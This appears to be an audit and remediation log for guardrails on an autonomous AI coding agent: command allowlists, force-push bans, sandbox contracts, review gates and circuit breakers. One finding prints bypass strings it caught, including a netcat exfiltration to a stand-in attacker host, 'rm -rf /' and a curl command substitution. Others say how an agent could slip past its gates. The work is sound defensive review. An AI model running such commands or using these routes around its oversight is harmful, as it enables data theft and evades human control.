| `ORPHAN-HIGH-454`     | `_check_no_force_push` read `push_refspecs` and never `bash_argv`, while the allowlist entry for push ends in `(\s+\S+)*` — which admits a flag. Three layers each missed `git push origin aria-impl-abc123 -f`. Fixed argv-token-wise, deliberately **not** by a blanket short-flag denial: `-n` is `--no-verify` on commit but a count on `git log`, and a gate that refuses safe commands gets routed around.                                                                                                     |
| `ORPHAN-HIGH-455`     | Above. Real callsite tests now drive `run_autonomy_orchestrator`; reverting it to base produces 4 failures where it previously produced none.                                                                                                                                                                                                                                                                                                                                                                        |
| `ORPHAN-HIGH-456`     | `_bounded_cycle_summary` is a closed literal that deletes `cycle_lifecycle`, so `cycle_lifecycle_unreadable` — the "zero incomplete" versus "ledger unreadable" distinction that `424`'s commit message sells as the feature — could never fire. Same for every cycle-level suppression marker. The exception path dropped the counter entirely, and a crashed cycle is the one most likely to have left an incomplete lifecycle.                                                                                    |

Every fix above is pinned by a test demonstrated failing against the pre-fix code: 20/20 subtests for
the perimeter set, 4 failures for the orchestrator revert, 3 failures and 1 error for the summary
literal.

**What the audit could not check, in its own words:** live CI (no Actions query was made by any
agent); `nx affected` across the monorepo; whether bwrap works on a real runner, since neither
backend is installed here; and branch protection or GitHub App scope. Its stated residual is that
**more fixes are untested at the callsite than the three it proved** — it ran the revert experiment
on five files out of roughly twenty fixes, and the pattern is structural rather than incidental.
That is recorded as the honest limit of this work, not as a claim of completeness.

## 9j. Re-verifying the 45 unchecked claims (`457`–`459`)

§9f acted on a partial read of the adversarial pass and said plainly that the rest was unverified. It
has now been checked: nine refute-by-default skeptics over 45 claims, judged against the **current**
head rather than the one the claims described, with "was true then, fixed since" as its own verdict.

**27 CONFIRMED, 6 ALREADY_FIXED, 6 PARTLY_TRUE, 1 REFUTED.** The original pass had high precision;
recording that matters as much as the findings, because §9f could not say it at the time.

Three were code defects still live and are fixed here.

**`ORPHAN-HIGH-457` — the retrace's own collision, reachable through the other door.**
`ORPHAN-HIGH-417` taught the _allocator_ to read `orphan-findings.md` alongside the registry and left
`appendExplicitFinding` reading the registry alone. A verifier drove the exported function directly
and it **accepted `ORPHAN-MEDIUM-416`** — a live markdown heading — returning 0.

My first fix silently did nothing, and the reason is worth recording: `orphanMarkdownReservedIds`
normalizes to `ORPHAN-RESERVED-NNN` because a heading carries no severity, and the classifier segment
varies with severity anyway, so comparing full id strings never matches. **The sequence is the
identity.** I found this by running my own proof against the real registry instead of a copy, which
appended a colliding row to the live hash chain; it was the last line, so it was removed and
`findings:verify` confirms the chain valid at 1074 entries with the tip unchanged. Recorded rather
than quietly reverted, because a fix attempt that mutates the SSoT is precisely the thing that should
not be silent.

The fix is structural: one `claimedIdsForDomain` both append paths read, and one `claimedSequences`
shared by `nextFindingId` and the explicit check — so a third append path inherits every store by
construction rather than by the author remembering all of them.

**`ORPHAN-MEDIUM-458` — a comment satisfied the sandbox contract.** A verifier deleted the entire
"Verify the sandbox actually confines" step from `aria-agent-executor.yml` and the contract still
passed: `_ASSERT_PATTERN` matched raw file text, and a comment forty lines earlier mentions
`sandbox_backend()`. Comments are now stripped before matching, with a self-check that a
comment-only workflow fails both patterns and a real command with a trailing comment still counts.

**`ORPHAN-MEDIUM-459` — a perimeter half with no caller.** `ORPHAN-CRITICAL-427`'s title names two
symbols; only one was wired. `apply_resource_limits` appears in four places — its definition, its
export, a name-pinning test, and `.claude/agents/aria-implementer.md`, which is prose addressed to
the process being limited. Now applied at the spawn site, outside the sandbox wrapper so
`timeout`/`systemd-run` own the whole tree, using the caller's `timeout_seconds` rather than the
helper's 120-second default, which would kill every real agent run.

**Also confirmed and NOT fixed here, deliberately:** the hard-fail perimeter still has no production
caller (`ORPHAN-CRITICAL-428`, OPEN, S2); four trailer/body contradictions are `UNFIXABLE_IN_PLACE`
under the force-push ban and are recorded rather than papered over; and a set of documentation
inaccuracies in this document and PLAN.md remain open — including §9c naming the wrong advisory set,
seven surviving bare old-ID references, and two frozen registry rows citing abandoned IDs.

## 9k. The claim set had almost no yield; the fresh lenses had all of it (`ORPHAN-CRITICAL-460`)

The 45-claim re-verification came back **27 CONFIRMED / 6 ALREADY_FIXED / 6 PARTLY_TRUE / 1
REFUTED**, and the number that matters is a different one: **zero survivors kept a CRITICAL or HIGH
severity after independent re-rating**, and roughly two-thirds of what remained was documentation
prose. Meanwhile the two fresh coverage lenses — reachability of every added control, and whether
any added gate fails open on an input it does not recognise — produced **eighteen findings including
two CRITICAL and five HIGH that the claim set never mentioned**.

That is worth stating plainly, because it is a result about method rather than about ARIA: verifying
a list of claims is bounded by the imagination of whoever wrote the list. The lenses were pointed at
defect _classes_ this branch had already demonstrated twice, and that is where everything serious
was.

**`ORPHAN-CRITICAL-460` — three layers defeated by one prefix.** `ALLOWED_BASH_COMMANDS` patterns are
shaped `^git\s+status(\s+\S+)*\s*$`, and that trailing group matches anything — including `&&`.
Every `DENIED_BASH_COMMANDS` pattern is `^`-anchored on argv-0, so the denylist only ever inspected
the first binary and saw `git`. And `ORPHAN-HIGH-454`'s brand-new argv-token check reads
`argv[:2] == ["git", "push"]`, which an allowed prefix blinds — so the fix landed hours earlier was
walked past by typing five more characters.

Reproduced at head before fixing. All of these were **ALLOWED**:

```
git status && git push origin main -f      ← force-push to main
git status && rm -rf /
git diff | nc attacker.example 4444        ← exfiltration
git status $(curl http://x)
git status > /tmp/exfil
```

…while every unchained equivalent was correctly refused, which is what proves chaining is the bypass
rather than a gap in the lists.

This one is **live, not latent.** Unlike the rest of the hard-fail perimeter — which
`ORPHAN-CRITICAL-428` records as having no production caller at all — `verify_bash_command_allowed`
has four: `tool_runner`, `tool_registry`, `verification_gate` and `fixture_runner`, and `tool_runner`
feeds it argv straight from tool config.

The fix is a precondition that runs before either list, because both lists reason about _a single
command_ and a chained argv is several. It tokenizes with `shlex(punctuation_chars=True)` rather than
regex-scanning, because the distinction that matters is quoting: `git commit -m 'fix A && B'` carries
`&&` as data and must still pass, while `git status && git push` carries it as an operator and must
not. An argv that cannot be lexed fails closed. Eleven bypass spellings refused, nine ordinary
commands still allowed, zero collateral.

**Still open from the fresh lenses, and not fixed here:** the failure circuit breaker can never trip
because `record_failure` has no producer (that is `ORPHAN-CRITICAL-420`, already OPEN); the
`no_main_branch_write` gh-api guard is a five-entry denylist that the routes which actually write
main all pass; and the hard-fail perimeter still has zero production callers
(`ORPHAN-CRITICAL-428`). Those are recorded rather than rushed, because each is a real design change
and this document's own lesson is that a fix written in a hurry is where the next finding comes from.

### `ORPHAN-CRITICAL-461` — three checks that passed on inputs asserting nothing

Same lens, same shape three times: the check asks a narrower question than the property it is named
for, so an input _vaguer_ than the one it rejects sails through.

|                                           | measured before the fix                                                                                                                                                                                                |
| ----------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `_check_kernel_self_modification_at_mint` | `["aria-kernel/aria_kernel/cli.py"]` **blocked**, but `["aria-kernel"]` — which contains it — **PASSED**. So did `["tools"]`, `["*"]`, `["**"]`, `["aria-kernel/**/*.py"]`, and `[]`.                                  |
| `_check_test_gate_canonical_suite`        | `("echo 'nx affected --target=test nx affected --target=lint npm run type-check'",)` **PASSED**. An echo of a comment cleared the test gate.                                                                           |
| `is_gh_api_path_forbidden`                | `PUT /contents/{path}` (commits straight to main), `PATCH /git/refs/heads/main` (moves the tip), `merges`, `rulesets`, `hooks`, `collaborators`, `keys` — all **allowed**. Only `branches/main/protection` was caught. |

The first one is the one worth sitting with: **it is in the function `ORPHAN-HIGH-453` fixed hours
earlier.** I corrected how the path is normalized and never asked which direction the comparison ran.
A scope claim that _contains_ a protected path is not safer than one that names it — it is the same
write with a vaguer envelope. The check now matches both directions, rejects globs as unclassifiable
(a glob cannot be prefix-compared without a filesystem that does not exist at mint time), and fails
an empty list the way an absent key already did.

The gh-api guard is now an allowlist rather than a denylist, which is tractable precisely because
ARIA's real surface is tiny: the only two production call sites are `commits/{sha}/check-runs` and
`commits/{sha}/status`. Deny still wins over allow, so `pulls/{n}/merge` stays refused even though
`pulls/{n}` is permitted. It is also the third denylist this session has had to invert, after
`ORPHAN-HIGH-443` and `ORPHAN-CRITICAL-460`.

**My first allowlist omitted the bare `/pulls` collection — `gh pr create` — and the existing
pre-PR-open exit-criterion test caught it, not me.** Worth recording as the counter-example to
everything else in this document: a gate that was already there, doing its job, on the first change
that broke it.

### `ORPHAN-HIGH-462` — hardening two sides of a gate created a perverse incentive on the third

`transform_specialist_output` returns `[]` both for "reviewed, found nothing" and for any content it
cannot parse. `_findings_from_accepted_result` passed that straight back, so a specialist whose
entire output was _"I ran out of context and could not complete this review"_ produced
`consolidated_no_gaps` and did not block. The function's own docstring said _"returning an empty
findings list here would read as this specialist found nothing"_ — while the code did exactly that.

What makes it worse than a plain fail-open is what this branch did around it. `ORPHAN-HIGH-423` made
non-delivery block; `ORPHAN-HIGH-443` made an unrecognised verdict block. Between them they left a
degraded or hostile agent exactly one path that still cleared the gate: **submit garbage.** Closing
two sides of a gate without looking at the third turned "do nothing" into the worse option and
"submit noise" into the better one.

The fix does not invent a marker. `.claude/shared/output-format.md` — the contract every Lane-A
specialist already writes to — mandates a `## Verdict` section, and the transformer already
recognises inline `VERDICT:` / `RULING:` forms. A zero-finding report must now carry one; a report
with findings needs no separate assertion, because findings are themselves evidence a review
happened. This needed no agent-prompt change, which matters: `.claude/agents/` is operator-only under
`READONLY_PATHS`, so a fix requiring prompt edits would have been unlandable here.

Both halves are pinned. Four not-a-review forms block; three sanctioned clean-review forms pass. The
second half is not decoration — **a gate a clean review cannot pass is not fail-closed, it is broken,
and it gets disabled.**

### `ORPHAN-MEDIUM-463` — the required gate that fails for reasons unrelated to the diff

`invariants-fast` went red on `deploy-ssot-contract.spec.ts:807` on head `00e0e8149`. The three
commits before it touched `implementation_safety.py`, its test, and docs/registry files; that spec
drives shell capacity-diagnostic code with a fake `du` binary and reads none of them, so the failure
is **causally unreachable from the diff**. Locally it passes 27/27 five times in isolation, and three
consecutive full `invariants:fast` runs show only the two known `backup-production-secrets` failures.

**Confirmed by the next run.** `invariants-fast` came back **green** on head `87093b042`, whose diff
touches that spec not at all — so it failed and then passed on identical code. That closes the
question of flake-versus-regression with evidence rather than with my assertion, which is the
distinction this whole document is about.

Registered rather than re-run and forgotten. An intermittently red required gate is a reliability
defect on its own: it trains reviewers to re-run instead of read, which is how a real failure
eventually gets waved through. Not fixed here — the root cause is a race in deploy capacity tooling,
a different domain from this branch, and guessing at a timing fix without reproducing it is how the
next finding gets created.

### `ORPHAN-MEDIUM-464` — the exception, and who granted it

`9fb8efce` is a `fix(gates):` commit with no `Closes:` trailer. The finding it should have cited is
real and registered — `ORPHAN-HIGH-417`, whose gate self-test wiring that commit restores — so this
is a missing _reference_, not a missing finding.

It cannot be repaired: `closes-footer-check` validates the whole PR range, so no follow-up commit
satisfies it, and amending a pushed commit needs a force-push that `CLAUDE.md` forbids outright. That
is the identical situation every annotated entry already in `PRE_PHASE6_SHAS` describes.

**I did not add the entry on my own, and that is the substantive part.** The set is documented as
frozen, and growing a governance allowlist to unblock one's own branch is self-authorisation — the
defect class this branch exists to close. Both routes were put to the operator with their costs (an
allowlist entry that bends a stated rule, or a third retrace that costs the PR and its review
history), and the allowlist was the route chosen. It is registered as a finding rather than left as
a SHA in a list so the exception stays auditable, and it is layer 4 — a documented exception, not a
structural fix.

The structural fix is `ORPHAN-HIGH-441`, already closed: the `commit-msg` hook that would have
refused this commit at write time bound for nobody, because its only install path was husky's
`prepare` and this repo mandates `npm ci --ignore-scripts`. With `hooks:install` and
`git-hook-binding.spec.ts` in place, the next missing trailer is refused before the commit exists
rather than discovered in CI, where it is unrepairable.

## 10. Limits of this verification

- The live GitHub Actions artifact was not re-downloaded. Every figure the report cited was instead
  explained from source (21/21 bridge `skipped` ⇒ P1-06; 0 tool runs ⇒ NoOp implementer; 13
  HUMAN_REQUIRED invisible ⇒ P1-03; cost dashboard 0 alongside 55 attribution rows ⇒ P0-07's zero
  callers). This is corroboration by mechanism rather than re-measurement.
- The report's P2 claim that 29 modules lack direct test imports was not independently re-derived;
  it is recorded as-is and remains a static signal, not proof of missing coverage.
- Branch protection rulesets and the GitHub App installation scope cannot be read from inside the
  repository and remain externally unverified — which is itself part of P0-14's exposure.

## 11. Wave-1 findings raised while closing the S1–S9 remediation sequence

Each entry below was registered in `docs/reviews/_registry/findings.jsonl` during the
remediation pass that followed this verification. They are anchored here because the
three-store invariant requires a finding's `review_file` to name it — an unanchored
finding is one nobody can navigate back to from the review that produced it.

- **ORPHAN-CRITICAL-469** — The agent-invocation queue was stranded between two workflows: the 01:00 producer wrote to a gitignored tree the 02:00 consumer never restored, so no agent work was ever claimed  
  Severity CRITICAL, layer 2, owner okan, deadline 2026-08-24. closed by the commit carrying its `Closes:` trailer.

- **ORPHAN-HIGH-465** — The failure circuit breaker had no operator surface: reset_breaker existed with no CLI, so a tripped breaker could only be cleared by hand-deleting a gitignored artifact  
  Severity HIGH, layer 4, owner okan, deadline 2026-08-24. closed by the commit carrying its `Closes:` trailer.

- **ORPHAN-HIGH-466** — The B0 cost breaker reads a counter nothing increments: cost_budget.record_actual_usage has zero callers while live cost telemetry writes to a different module  
  Severity HIGH, layer 2, owner okan, deadline 2026-08-24. closed by the commit carrying its `Closes:` trailer.

- **ORPHAN-HIGH-467** — The B2 failure breaker preflight was gated on profile == autonomous, so a tripped breaker stopped nothing on standard or strict, which hold action authority  
  Severity HIGH, layer 2, owner okan, deadline 2026-08-24. closed by the commit carrying its `Closes:` trailer.

- **ORPHAN-HIGH-470** — Agent resource limits were selected on binary presence, applied the wrong wall-clock property, and fell through to an unbounded spawn  
  Severity HIGH, layer 2, owner okan, deadline 2026-08-24. closed by the commit carrying its `Closes:` trailer.

- **ORPHAN-HIGH-471** — The nightly lane spawns agents through the same path as the executor but shipped with no sandbox backend installed  
  Severity HIGH, layer 2, owner okan, deadline 2026-08-24. closed by the commit carrying its `Closes:` trailer.

- **ORPHAN-HIGH-472** — Cost caps are mis-calibrated by 40x against real agent-run cost, so wiring the pre-spawn gate would trip the cost breaker on the first live run  
  Severity HIGH, layer 4, owner okan, deadline 2026-08-24. OPEN — see notes.

- **ORPHAN-HIGH-473** — Moving ARIA to claude-opus-5 at max effort is a multi-surface migration: the model would silently downgrade to fable, record $0.00, and disable the credit-exhaustion fallback  
  Severity HIGH, layer 2, owner okan, deadline 2026-08-24. OPEN — see notes.

- **ORPHAN-HIGH-474** — The opus CLI alias resolves to claude-opus-5, which had no pricing row, so every opus-tier dispatch recorded $0.00  
  Severity HIGH, layer 3, owner okan, deadline 2026-08-24. closed by the commit carrying its `Closes:` trailer.

- **ORPHAN-HIGH-475** — A quota-exhausted run was returned as the agent's answer: the fallback was gated on a literal model name and no caller inspected credit_exhaustion  
  Severity HIGH, layer 1, owner okan, deadline 2026-08-24. closed by the commit carrying its `Closes:` trailer.

- **ORPHAN-HIGH-476** — Cost pricing was keyed only on exact model ids, so every new model generation silently priced at $0.00 until a human added a row  
  Severity HIGH, layer 2, owner okan, deadline 2026-08-24. closed by the commit carrying its `Closes:` trailer.

- **ORPHAN-MEDIUM-468** — The failure breaker's 24h window equals the nightly cadence, so cross-cycle accumulation depends on sub-cycle timing jitter rather than on failure count  
  Severity MEDIUM, layer 3, owner okan, deadline 2026-08-24. closed by the commit carrying its `Closes:` trailer.

- **ORPHAN-MEDIUM-477** — ARIA agents ran below ultracode depth, and the tier documentation contradicted the executable assertions  
  Severity MEDIUM, layer 3, owner okan, deadline 2026-08-24.

- **ORPHAN-HIGH-478** — The model fallback was a single hardcoded hop: audit rows named fable->opus@xhigh as a literal and the budget multiplier keyed on the alias string  
  Severity HIGH, layer 2, owner okan, deadline 2026-08-24.

- **ORPHAN-CRITICAL-479** — A NameError on the only real worker-dispatch path shipped with 2905 passing tests, and the first two detectors written for it were themselves theatre  
  Severity CRITICAL, layer 3, owner okan, deadline 2026-08-25.

- **ORPHAN-HIGH-480** — The run_with_model_fallback docstring described the pre-ladder single-hop policy on five counts after the code had moved on  
  Severity HIGH, layer 2, owner okan, deadline 2026-08-25.

- **ORPHAN-HIGH-481** — has_fallback_tier was added with the ladder and had zero production callers  
  Severity HIGH, layer 2, owner okan, deadline 2026-08-25.

- **ORPHAN-MEDIUM-482** — Cost rows recorded at exactly a window boundary were dropped, under-counting spend against a safety cap  
  Severity MEDIUM, layer 2, owner okan, deadline 2026-08-25.

- **ORPHAN-MEDIUM-483** — The 72h failure window that fixed ORPHAN-MEDIUM-468 was itself the boundary value, so the bleed case still coin-flipped at the enforcement gate  
  Severity MEDIUM, layer 2, owner okan, deadline 2026-08-25.

- **ORPHAN-CRITICAL-484** — The executor could publish a queue-less bootstrapped tree under the canonical aria-tools-state name, burying the producer's queue with no automated recovery  
  Severity CRITICAL, layer 1, owner okan, deadline 2026-08-25.

- **ORPHAN-CRITICAL-485** — The failure breaker's producer was unreachable on the scheduled lane at four independent levels, and its end-to-end test could not see any of them  
  Severity CRITICAL, layer 1, owner okan, deadline 2026-08-25.

- **ORPHAN-HIGH-486** — ARIA can open an unbounded PR: plan_pr_split exists but no autonomous path calls it, so nothing caps what the implementer submits  
  Severity HIGH, layer 1, owner okan, deadline 2026-08-25. OPEN — scheduled for a follow-up PR.

- **ORPHAN-HIGH-487** — Nothing stops ARIA promoting a second plan while one is still in flight, so it can leave half-finished work behind  
  Severity HIGH, layer 1, owner okan, deadline 2026-08-25. OPEN — scheduled for a follow-up PR.

- **ORPHAN-CRITICAL-488** — The ORPHAN-CRITICAL-484 ancestry gate made a first-ever ARIA run impossible: a newborn tree could never publish, permanently  
  Severity CRITICAL, layer 1, owner okan, deadline 2026-08-25.

- **ORPHAN-HIGH-489** — ClaudeCreditExhausted escaped ci_executor.main() uncaught, leaking the claim for the full lease window  
  Severity HIGH, layer 2, owner okan, deadline 2026-08-25.

- **ORPHAN-MEDIUM-491** — The workflow abort gate matched its guard by substring, so an `||`-joined `always()` disjunct passed as guarded  
  Severity MEDIUM, layer 1, owner okan, deadline 2026-08-26. `_verify_abort_gate` compared the guard with `in`, so
  `if: ${{ <guard> || always() }}` contained the guard verbatim while being unconditionally true — the step ran during a
  blocked cycle, which is the exact failure the gate's own docstring says it prevents.

- **ORPHAN-MEDIUM-492** — `next_pending_request` never read the `target_sha` it selects on, so a request minted against an obsolete tree stayed claimable forever  
  Severity MEDIUM, layer 1, owner okan, deadline 2026-08-26. The sharpest instance of this branch's defect class: the anchor
  was minted, persisted, hashed into the context envelope and read by the evidence-validator — and the selection path ignored
  it. The ~20 requests stranded by `ORPHAN-CRITICAL-469` are anchored at commits that ARE ancestors of HEAD, 60+ commits back,
  so reachability alone would have passed every one; age is checked too. New terminal state `ANCHOR_STALE`, kept separate from
  the retryable `STALE`.

- **ORPHAN-HIGH-472 reframed and closed** — the "40× cost cap disagreement" was a units error, not a calibration one.
  ARIA runs its agents through the Claude Code CLI on a logged-in subscription session (`claude_runtime.py:3-13`; both
  workflows reject `ANTHROPIC_API_KEY`), so there is no marginal per-run charge for a dollar cap to bound. Four figures
  disagreed — `cost_budget` `per_run` $0.50, the workflow's `--max-budget-usd-per-run 20.00` **and**
  `--max-budget-usd-per-cycle 3.00` in the same invocation, and a ~$1.15 measured run — because none was measuring spend.
  The dispatch gate is now per-cycle wall clock, derived from each lane's pinned `timeout-minutes`, refusing any dispatch
  whose own timeout exceeds the remaining budget. USD stays as telemetry, labelled `usd_basis: notional_api_equivalent`.

- **ORPHAN-HIGH-493** — `reserve_cycle_budget` remains an orphaned USD enforcement point  
  Severity HIGH, layer 1, owner okan, deadline 2026-08-26. **Declared incomplete work.** The approved plan said the third
  orphaned cost control would be consolidated in the same commit; it was not, because it is pinned by v8 prerequisite
  invariants and its CLI flags by another, and editing pinned invariants late in a green 65-commit PR is the trade
  `ORPHAN-HIGH-486` exists to discourage. Recorded rather than implied.

- **ORPHAN-CRITICAL-494** — the `492` anchor guard read absence-in-a-shallow-clone as proof of unreachability  
  Severity CRITICAL, layer 1, owner okan, deadline 2026-08-26. **Self-inflicted, caught before it ever ran, and strictly
  worse than the defect it was introduced to fix.** Neither ARIA lane sets `fetch-depth`, so both run on the default
  depth-1 clone. A request minted by the 01:00 producer and consumed by the 02:00 executor therefore has an anchor that is
  simply _absent_ once any commit lands in between — and the guard would have marked it **terminally** `ANCHOR_STALE`,
  silently discarding the very queue `ORPHAN-CRITICAL-469` exists to carry, while emitting a governance row that reads like
  correct enforcement. Reachability is now consulted only when the repo is not shallow; age needs no history and still
  fires, so `492`'s case is still caught on the checkout production actually uses. Found by asking what the guard does
  under the _production_ checkout rather than the fixture's full clone — the same fixture-does-not-match-production
  blindness that let the original `492` defect survive, which is why seven passing tests said nothing about it.

- **ORPHAN-CRITICAL-495** — two more self-inflicted defects in the same closeout, found by the regression review lens  
  Severity CRITICAL, layer 1, owner okan, deadline 2026-08-26. **(a)** A missing anchor was terminal, and an AST count of all
  17 `create_agent_invocation_request` callsites shows only **6** pass `target_sha` — the other 11 include the operator's own
  `aria-kernel agent request` CLI and this branch's new HUMAN_REQUIRED panel, which could therefore never have been
  dispatched. A guard written to protect the queue would have destroyed it. Absence of a SHA is no longer grounds for
  refusal; age does the real work and needs no anchor. **(b)** The `472` wall-clock gate accounted against
  `request["cycle_id"]`, which **15 of 17** mint paths never set — written, tested, name-pinned and unreachable, the exact
  defect class this branch exists to close, in the commit that claimed to close it. The ceiling now derives from
  `GITHUB_RUN_STARTED_AT`, which is also the better question for a lane that handles one request per job.

- **ORPHAN-HIGH-496** — two hand-maintained copies of the non-delivering terminal-state set fell behind the SSoT  
  Severity HIGH, layer 1, owner okan, deadline 2026-08-26. `review_runner` and `specialist_review_runner` each carried a
  literal frozenset; adding `ANCHOR_STALE` updated neither, so an anchor-refused request was terminal-but-unrecognised and
  each poll loop would burn its full timeout waiting for a result that could not arrive. Both are now derived as
  `TERMINAL_REQUEST_STATES - {"ACCEPTED"}` — tier 2 replacing what was effectively two comments asking future readers to
  remember.

- **ORPHAN-CRITICAL-497** — the wall-clock gate refused _every_ dispatch under production values  
  Severity CRITICAL, layer 1, owner okan, deadline 2026-08-26. Found by the test-quality lens, which **executed** the code.
  Cap was `(35−5)×60 = 1800s` and the executor sets `MAX_TIMEOUT_SECONDS=1800`, so `remaining < per_run_timeout` was false
  only at `elapsed == 0`. `main()` catches the refusal, releases the claim and returns **0** — the lane would have gone
  permanently green-and-idle: claim, refuse, release, exit 0, forever, no agent ever running and no job red. It also
  exposed a real latent config problem: an 1800s run does not fit a 2100s job once startup and publish are counted, so the
  executor timeout moves **35 → 45 min** with the contract pinned in lockstep. Tests now read cap and per-run timeout from
  their sources. Second half: `_step_is_gated` exempted the announce expression **globally**, so flipping one character
  (`!=` → `==`) on a worker step made the executor run _only_ while another host held the lease —
  `ORPHAN-CRITICAL-469` restored with the gate green. Exemption is now scoped to the declared announce step.

> **Pattern, four times in one session.** Every defect above survived because the fixture did not resemble production: a
> full clone where production is shallow (`494`), a request dict carrying a field 11 mint paths omit (`495`), a timeout
> literal production never emits (`497`). The lens that caught them ran the code; the lenses that missed them read it.

- **ORPHAN-CRITICAL-498** — the pre-PR-open perimeter is **not on the scheduled lane**  
  Severity CRITICAL, layer 1, owner okan, deadline 2026-08-12. Successor to `ORPHAN-CRITICAL-428`, whose closure claim is
  narrower than it reads. The two lenses contradicted each other — one predicted the perimeter would trip the breaker on
  the nightly lane, the other said that path is unreachable — and the source settles it: `grep` for `run_phases=` /
  `pre_tool_phases=` across `aria-kernel/`, `tools/` and `.github/` returns **one comment and no caller**. So
  `_run_extended_phases` never runs, `_run_pr_lifecycle_phase` never runs, and `run_hard_fail_checks` executes in
  production **only** when an operator types `pr open`. The regression lens's self-halt HIGH is refuted on reachability and
  replaced by something worse: not "the perimeter halts the lane" but "the perimeter is not on the lane". `record_failure`
  at `cycle.py:948` is dead on the same path, but the breaker producer survives via `planner_dispatch_hook.py:388`, so
  `ORPHAN-CRITICAL-485` **is** genuinely closed. Fix is RC-1 of the follow-up plan: collapse the two pipelines into one
  declarative registry, delete the kwarg seam, and add a static call-graph reachability invariant.

- **ORPHAN-HIGH-499** — the HUMAN*REQUIRED sweep test asserts an import, not a call  
  Severity HIGH, layer 1, owner okan, deadline 2026-08-12. Proven by mutation rather than argued: deleting the call at
  `cycle.py:503` while keeping the import leaves all 6 tests in the file green **and the entire 2943-test suite
  byte-identical**. No Python linter runs in CI, so the orphaned import is not flagged either. The sweep call itself \_is*
  live (inside `run_enterprise_cycle`, not the dead branch) — this is a blind-test defect, not a dead-path one, and the two
  must not be conflated. Fix reuses the pattern already correct at `test_pr_open_perimeter_callsite.py:132-142`.

- **ORPHAN-HIGH-500** — the pre-commit hook mirrors one of CI's two format gates  
  Severity HIGH, layer 3, owner okan, deadline 2026-08-13. **Found by CI, not by review**, which is the point: this PR's
  first real CI run went red on `quality.mjs format check-changed` with ten drifted files, every one authored in this
  session. `.husky/pre-commit` ran `format-scope check` — manifest freshness — while its own comment claimed the intent was
  to catch CI redness at commit time; the gate that catches actual drift had **no local counterpart at all**, and eight
  commits shipped drift with a green hook. Same defect class as `ORPHAN-HIGH-455` in mirror image: here the CI side is
  wired and the local mirror is the missing half. Second-order defect: `quality.mjs` offered no `write-changed`, so the
  only one-command fix was repo-wide `format write`, which also rewrites the ~24 files `check-changed` deliberately
  quarantines as base debt — a 10-file fix buried in 34 files of churn. Closed here: the regression rule extracted to one
  `classifyFormatDrift` shared by `check-changed`, a new `check-staged` and a new `write-changed`; the staged gate wired
  into the hook (staged-vs-HEAD, because at commit time the content is not committed yet and `HEAD^` compares the wrong
  pair); and the mirror pinned by a `git-hook-binding` invariant that **discovers** CI's gates instead of listing them.
  Two negative results worth recording. `write-changed` needed a convergence loop: Prettier's markdown printer left
  `2026-07-26-aria-codex-audit-verification.md` still drifted after one `--write`, converging only on a second pass — so a
  single-pass fixer would have handed the developer a green command and a red CI, the exact failure it exists to prevent.
  And the parity invariant's **first version was blind**: `hooks.includes('format check-changed')` matched the phrase
  inside the hook's own explanatory comment, so it stayed green when the real invocation was deleted. It now strips
  comment lines and matches invocations structurally — the substring-instead-of-structure defect this branch already fixed
  once, reproduced by me while fixing its sibling.

- **ORPHAN-HIGH-502** — the refuted `pr_lifecycle` route was still asserted as production fact in two artifacts  
  Severity HIGH, layer 1, owner okan, deadline 2026-08-13. `ORPHAN-CRITICAL-498` established that
  `_run_extended_phases` has no production caller, so `_run_pr_lifecycle_phase` never executes. That correction reached
  one test docstring and **missed two other artifacts repeating the refuted claim.** First,
  `tests/invariants/v3/test_breaker_end_to_end_reachability.py` claimed to run "the REAL chain" while calling
  `cycle_mod._run_pr_lifecycle_phase` directly — a green invariant whose _name_ is exactly what someone greps before
  shipping a lane with no producer, and whose successor already existed with a header enumerating four ways the old path
  was dead. Two files claiming one invariant. Second, `pr_manager.py` carried, inside the load-bearing comment justifying
  where the perimeter check sits, the assertion that the only production route was the cycle's `pr_lifecycle` phase with
  `dry_run=True`. A reader trusting that comment concludes the perimeter is on the scheduled lane — which is how 498
  survived review. Closed here: superseded invariant **deleted** (successor plus the callsite test cover the behaviour,
  10 tests green after removal; the only remaining reference was a generated nx cache artifact, so nothing name-pinned
  it) and the comment corrected in place with the refuted chain quoted, so the correction is auditable rather than a
  silent edit. **Plan correction recorded rather than followed:** RC-8 also specified moving a misplaced `__main__` guard
  at `test_pr_open_perimeter_callsite.py:185`. That is stale — the guard sits at line 302, after both test classes. The
  plan predates the current file; no move was needed and none was made.

- **ORPHAN-HIGH-501** — `lint-and-typecheck` outgrew its 15-minute budget, so its last two gates stopped running  
  Severity HIGH, layer 3, owner okan, deadline 2026-08-13. Measured, not inferred. On head `5967d7285` the job started
  06:45:42 and was cancelled 07:00:55 — **15m13s against `timeout-minutes: 15`** — inside step 9 `type-check-spec`, with
  step 10 `Check formatting of changed files` reported `skipped`. Nothing was pushed after that head, so this was the job
  timeout and not the concurrency cancel that killed the run before it. The merge of main added a workspace, which grew the
  linter from 6m36s to 8m57s and tipped a job that had fit in 12m25s. **The consequence is the point:** a cancelled job
  runs none of its remaining steps, so the format gate — the very gate whose missing local mirror is `ORPHAN-HIGH-500` —
  was not executing in CI either, one layer up. It still failed closed, because `build-status` treats `cancelled` as
  not-success, but it printed `Lint/Typecheck failed` and sent the reader hunting a lint error that did not exist. Budget
  raised to 25 min against a ~17.5 min measured need, consistent with this file's own conventions (test 30, build 30,
  deploy-ssot-gates 20). Deliberately **not** fixed here: splitting the four serial passes into parallel jobs is the better
  design, but the job names are wired into the `build-status` aggregate and the required-status-check manifest, so a split
  touches branch protection and needs the ruleset moved in lockstep.
